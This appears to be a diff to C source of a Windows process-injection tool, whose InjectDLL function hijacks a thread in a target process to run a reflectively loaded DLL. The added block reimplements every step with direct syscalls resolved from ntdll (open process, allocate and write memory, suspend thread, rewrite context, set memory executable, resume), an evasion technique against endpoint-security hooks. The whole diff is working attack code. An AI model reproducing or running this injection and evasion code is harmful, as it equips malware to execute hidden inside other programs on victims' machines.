@@ -416,46 +416,128 @@ BOOL InjectDLL(CHAR* Bytes, SIZE_T Size, DWORD PID)
     PULONG  pSus       = 0;
     LPVOID  rBuffer    = NULL;
     CONTEXT ctx        = { 0 };
-    PVOID   pRemoteCtx = NULL;
+    LPVOID  pRemoteCtx = NULL;
     SIZE_T  nBytes     = 0;
 
     // get the offset
     DWORD dwOffset = GetReflectiveLoaderOffset(Bytes);
 
+    #ifdef SECURE
+        ULONG oProc, nProc;
+        CLIENT_ID uPid = { 0 };
+        struct NtInfo NtdllInfo;
+        struct Syscalls rSyscall;
+        SIZE_T uSize = (SIZE_T)Size;
+        OBJECT_ATTRIBUTES ObjectAttributes;
+
+        // init the attributes
+        InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
+
+        // set the correct pid
+        uPid.UniqueProcess = (HANDLE)PID;
+        uPid.UniqueThread = NULL;
+
+        // populate our syscall and ntdll structs
+        ParseNtdll(&NtdllInfo, &rSyscall);
+
+        // get a handle on the process
+        MakeSyscall("NtOpenProcess", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &ObjectAttributes, &uPid);
+        CleanSyscall(SyscallStub);
+
+        // alloc memory in the process & write the dll to it
+        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+        CleanSyscall(SyscallStub);
+        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtWriteVirtualMemory(hProcess, rBuffer, Bytes, Size, NULL);
+        CleanSyscall(SyscallStub);
+
+        // find any thread in the process an suspend it
+        rThread = GetThread(PID);
+        MakeSyscall("NtSuspendThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtSuspendThread(rThread);
+        CleanSyscall(SyscallStub);
+
+        // get the current context of the thread
+        ctx.ContextFlags = CONTEXT_FULL;
+        MakeSyscall("NtGetContextThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtGetContextThread(rThread, &ctx);
+        CleanSyscall(SyscallStub);
+
+        // write the ctx to a cave
+        MakeSyscall("NtAllocateVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtAllocateVirtualMemory(hProcess, &pRemoteCtx, 0, &uSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+        CleanSyscall(SyscallStub);
+
+        MakeSyscall("NtWriteVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtWriteVirtualMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);
+
+        // set up the new context
+        ctx.Rip = (DWORD64)rBuffer + dwOffset;
+        ctx.Rcx = (DWORD64)pRemoteCtx;
+
+        // write rcx to the cave
+        rSyscall.NtWriteVirtualMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);
+        CleanSyscall(SyscallStub);
+
+        // have room for the stack to grow
+        ctx.Rsp = ctx.Rsp - 0x2000;
+
+        // write the updated context
+        MakeSyscall("NtSetContextThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtSetContextThread(rThread, &ctx);
+        CleanSyscall(SyscallStub);
+
+        // change the permisions on the memory so we can execute it
+        MakeSyscall("NtProtectVirtualMemory", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtProtectVirtualMemory(hProcess, &rBuffer, &uSize, PAGE_EXECUTE_READWRITE, &oProc);
+        CleanSyscall(SyscallStub);
+
+        // start the thread executing again
+        MakeSyscall("NtResumeThread", NtdllInfo.pExprtDir, NtdllInfo.lpRawData, NtdllInfo.pTextSection, NtdllInfo.pRdataSection, SyscallStub);
+        rSyscall.NtResumeThread(rThread);
+        CleanSyscall(SyscallStub);
+
+        DEBUG("syscalls baby");
+    #endif
+
     // get a handle on the process
-    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+    #ifndef SECURE
+        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
 
-    // alloc memory in the process & write the dll to it
-    rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
+        // alloc memory in the process & write the dll to it
+        rBuffer = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+        WriteProcessMemory(hProcess, rBuffer, Bytes, Size, NULL);
 
-    // find any thread in the process an suspend it
-    rThread = GetThread(PID);
-    SuspendThread(rThread);
+        // find any thread in the process an suspend it
+        rThread = GetThread(PID);
+        SuspendThread(rThread);
 
-    // get the current context of the thread
-    ctx.ContextFlags = CONTEXT_FULL;
-    GetThreadContext(rThread, &ctx);
+        // get the current context of the thread
+        ctx.ContextFlags = CONTEXT_FULL;
+        GetThreadContext(rThread, &ctx);
 
-    // write the ctx to a cave
-    pRemoteCtx = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
-    WriteProcessMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);
+        // write the ctx to a cave
+        pRemoteCtx = VirtualAllocEx(hProcess, NULL, Size, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
+        WriteProcessMemory(hProcess, pRemoteCtx, &ctx, sizeof(ctx), NULL);
 
-    // set up the new context
-    ctx.Rip = (DWORD64)rBuffer + dwOffset;
-	ctx.Rcx = (DWORD64)pRemoteCtx;
+        // set up the new context
+        ctx.Rip = (DWORD64)rBuffer + dwOffset;
+        ctx.Rcx = (DWORD64)pRemoteCtx;
 
-    // get the
-    WriteProcessMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);
+        // write rcx to the cave
+        WriteProcessMemory(hProcess, (LPVOID)(((LPBYTE)rBuffer) + 2), &ctx.Rcx, sizeof(ctx.Rcx), &nBytes);
 
-    // have room for the stack to grow
-    ctx.Rsp = ctx.Rsp - 0x2000;
+        // have room for the stack to grow
+        ctx.Rsp = ctx.Rsp - 0x2000;
 
-    // write the updated context
-    DWORD stat = SetThreadContext(rThread, &ctx);
+        // write the updated context
+        DWORD stat = SetThreadContext(rThread, &ctx);
 
-    // start the thread executing again
-    ResumeThread(rThread);
+        // start the thread executing again
+        ResumeThread(rThread);
+    #endif
 
     // reslove the address of NtAlertResumeThread
     _NtAlertResumeThread NtAlertResumeThread = (_NtAlertResumeThread)GetProcAddress(LoadLibrary("ntdll.dll"), "NtAlertResumeThread");
